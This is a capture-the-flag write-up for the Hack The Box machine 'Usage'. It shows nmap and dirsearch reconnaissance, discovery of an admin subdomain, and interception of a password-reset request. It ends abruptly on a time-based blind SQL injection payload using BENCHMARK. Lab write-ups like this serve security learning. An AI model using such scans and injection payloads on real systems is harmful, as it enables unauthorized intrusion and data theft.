# Usage Write-up

<img src="https://labs.hackthebox.com/storage/avatars/23e804513a47e8f20bc865d0419946e1.png" width="200" height="200">

## Nmap

`nmap -sC -sV -p- usage.htb`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
    |_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Daily Blogs
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

`nmap -sC -sV -p- usage.htb`

    PORT      STATE    SERVICE        VERSION
    22/tcp    open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
    |_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
    80/tcp    open     http           nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://usage.htb/
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    2403/tcp  filtered taskmaster2000
    3814/tcp  filtered neto-dcs
    4117/tcp  filtered hillrserv
    5902/tcp  filtered vnc-2
    8045/tcp  filtered unknown
    13399/tcp filtered unknown
    17530/tcp filtered unknown
    17551/tcp filtered unknown
    20279/tcp filtered unknown
    20295/tcp filtered unknown
    20541/tcp filtered unknown
    21060/tcp filtered unknown
    22856/tcp filtered unknown
    39584/tcp filtered unknown
    41538/tcp filtered unknown
    43643/tcp filtered unknown
    44553/tcp filtered rbr-debug
    58049/tcp filtered unknown
    58201/tcp filtered unknown
    58432/tcp filtered unknown
    58715/tcp filtered unknown
    58989/tcp filtered unknown
    64790/tcp filtered unknown
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add `usage.htb` to `/etc/hosts`

## Dirsearch

`python3 dirsearch.py -u http://usage.htb/ --exclude-status 403,404,400,401,503 -o dir`

    Target: http://usage.htb/
    
    [07:05:38] Starting:                                                                                                                  
    [07:07:13] 302 -  334B  - /dashboard/  ->  http://usage.htb/login           
    [07:08:21] 200 -   24B  - /robots.txt                                       
                                                                                 
    Task Completed                                                                                                                        
                                         
http://usage.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/3483821e-2005-4105-aabf-409e5547619e)

Create accaount and login

![image](https://github.com/zer00d4y/writeups/assets/128820441/2c090840-9d55-4309-8c41-275ec38baf12)

In the source page we found `admin.usage.htb` subdomain

![image](https://github.com/zer00d4y/writeups/assets/128820441/d7bf8248-0170-465e-bbed-da9b7542902b)

Add `admin.usage.htb` to `/etc/hosts`

http://admin.usage.htb

![image](https://github.com/zer00d4y/writeups/assets/128820441/769b529d-c707-4708-b870-cf16138a1efa)

Let's try to reset the password and save the request to Burp

![image](https://github.com/zer00d4y/writeups/assets/128820441/b7181ba7-3777-45a9-8af2-93fbc4dcf724)

    ' AND 4720=BENCHMARK(5000000,MD5(0x4866544a))-- SwMa---

